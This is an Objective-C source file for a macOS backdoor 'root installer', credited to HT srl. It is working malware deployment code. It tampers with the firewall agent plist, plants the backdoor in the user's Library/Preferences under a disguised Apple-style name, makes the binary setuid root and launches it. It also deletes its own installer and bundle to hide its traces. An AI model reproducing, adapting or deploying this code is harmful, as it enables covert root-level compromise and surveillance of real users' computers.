/*
 * MacOS root installer
 * Root installer for online/offline installation
 * 
 * Created by Alfredo 'revenge' Pesoli on 30/03/2011
 * Copyright (C) HT srl 2011. All rights reserved
 */

#import <Foundation/Foundation.h>

#import <sys/stat.h>
#import <sys/types.h>
#import <pwd.h>

#define INSTALLER_PLIST @"com.apple.mdworkers.plist"


void changeAttributesForBinaryAtPath(NSString *aPath, int uid, int gid, u_long permissions)
{
  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
  NSValue *owner      = [NSNumber numberWithInt: uid];
  NSValue *group      = [NSNumber numberWithInt: gid];

  NSFileManager *_fileManager = [NSFileManager defaultManager];
  NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
                                  permission,
                                  NSFilePosixPermissions,
                                  owner,
                                  NSFileOwnerAccountID,
                                  group,
                                  NSFileGroupOwnerAccountID,
                                  nil];

  [_fileManager setAttributes: tempDictionary
                 ofItemAtPath: aPath
                        error: nil];
}

void executeTask(NSString *anAppPath,
                 NSArray *arguments,
                 BOOL waitForExecution)
{
  if ([[NSFileManager defaultManager] fileExistsAtPath: anAppPath] == NO)
    {
      return;
    }

  NSTask *task = [[NSTask alloc] init];
  [task setLaunchPath: anAppPath];

  if (arguments != nil)
    [task setArguments: arguments];

  NSPipe *_pipe = [NSPipe pipe];
  [task setStandardOutput: _pipe];
  [task setStandardError:  _pipe];

  [task launch];

  if (waitForExecution == YES)
    [task waitUntilExit];

  [task release];
}

void restoreAlfPlist()
{
  NSString *alfPlistPath = [[NSString alloc] initWithFormat: @"/Library/Preferences/com.apple.alf.agent.plist",
            [[NSBundle mainBundle] bundlePath]];

  NSString *destAlfPlistPath = [[NSString alloc] initWithString:
    @"/System/Library/LaunchDaemons/com.apple.alf.agent.plist"];

  NSFileManager *_fileManager = [NSFileManager defaultManager];

  if ([_fileManager fileExistsAtPath: alfPlistPath] == NO)
    {
      return;
    }

  //
  // Remove the current alf agent plist
  //
  [_fileManager removeItemAtPath: destAlfPlistPath
                           error: nil];

  //
  // Copy it to destination
  //
  [_fileManager moveItemAtPath: alfPlistPath
                        toPath: destAlfPlistPath
                         error: nil];

  u_long permissions  = (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
  changeAttributesForBinaryAtPath(destAlfPlistPath, 0, 0, permissions);

  [alfPlistPath release];
  [destAlfPlistPath release];
}

void deleteCurrentDir()
{
  [[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                                             error: nil];
}

int main(int ac, char *av[])
{
  //
  // <username> <backdoor_dir_name> <backdoor_binary_name>
  //
  if (av[1] == NULL || av[2] == NULL || av[3] == NULL)
    return 0;

  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  NSFileManager *_fileManager = [NSFileManager defaultManager];

  //
  // Parse Arguments
  //
  NSString *username = [[NSString alloc] initWithCString: av[1]
                                                encoding: NSUTF8StringEncoding];
  NSString *_backdoorDir = [[NSString alloc] initWithCString: av[2]
                                                    encoding: NSUTF8StringEncoding];
  NSString *backdoorDir = [[NSString alloc] initWithFormat: @"%@.app", _backdoorDir];

  NSString *binary = [[NSString alloc] initWithCString: av[3]
                                              encoding: NSUTF8StringEncoding];

  NSString *destinationDir = [[NSString alloc] initWithFormat: @"/Users/%@/Library/Preferences/%@",
                              username,
                              backdoorDir];

  [_backdoorDir release];
  [backdoorDir release];

  NSString *binaryPath = [[NSString alloc] initWithFormat: @"%@/%@",
           destinationDir,
           binary];

  //
  // Restore com.apple.alf.agent.plist
  //
  restoreAlfPlist();

  if ([_fileManager fileExistsAtPath: binaryPath])
    {
      //
      // In case the backdoor binary is already there delete our dir
      // and do nothing
      //
      deleteCurrentDir();

      return 0;
    }

  //
  // Create destination dir
  //
  NSArray *arguments = [NSArray arrayWithObjects:
    @"-u",
    username,
    @"/bin/mkdir",
    destinationDir,
    nil];

  executeTask(@"/usr/bin/sudo", arguments, NO);
  //mkdir([destinationDir UTF8String], 0755);

  //
  // Delete installer plist path
  //
  NSString *installerPlistPath = [[NSString alloc] initWithFormat: @"%@/%@",
           [[NSBundle mainBundle] bundlePath],
           INSTALLER_PLIST];

  [_fileManager removeItemAtPath: installerPlistPath
                           error: nil];
  [installerPlistPath release];

  //
  // Delete ourself in order to avoid to be copied in the next for cycle
  //
  [_fileManager removeItemAtPath: [[NSBundle mainBundle] executablePath]
                           error: nil];

  NSString *currentDir = [[NSString alloc] initWithFormat: @"%@",
           [[NSBundle mainBundle] bundlePath]];

  NSArray *dirContent = [_fileManager contentsOfDirectoryAtPath: currentDir
                                                          error: nil];

  int filesCount = [dirContent count];
  int i;

  for (i = 0; i < filesCount; i++)
    {
      NSString *fileName = [dirContent objectAtIndex: i];
      NSString *filePath = [NSString stringWithFormat:
        @"%@/%@", currentDir, fileName];
      NSString *destPath = [NSString stringWithFormat:
        @"%@/%@", destinationDir, fileName];

      //
      // Move every single file left to destPath
      //
      [_fileManager moveItemAtPath: filePath
                            toPath: destPath
                             error: nil];
    }

  [currentDir release];
  [binary release];
  [destinationDir release];

  u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
  changeAttributesForBinaryAtPath(binaryPath, 0, 0, permissions);

  arguments = [NSArray arrayWithObjects:
    @"-u",
    username,
    binaryPath,
    nil];

  //
  // Execute it as the user
  //
  executeTask(@"/usr/bin/sudo", arguments, NO);

  //
  // Delete current dir
  //
  [_fileManager removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                           error: nil];

  //
  // Wait for backdoor installation
  //
  NSString *workerFlagPath = [[NSString alloc] initWithFormat:
    @"%@/mdworker.flg",
    destinationDir];

  while ([_fileManager fileExistsAtPath: workerFlagPath] == NO)
    {
      sleep(1);
    }

  //
  // Wait just to be sure (if we exit before the child process
  // has finished we might force-kill it)
  //
  sleep(5);

  [workerFlagPath release];
  [username release];
  [binaryPath release];
  [outerPool release];

  return 0;
}
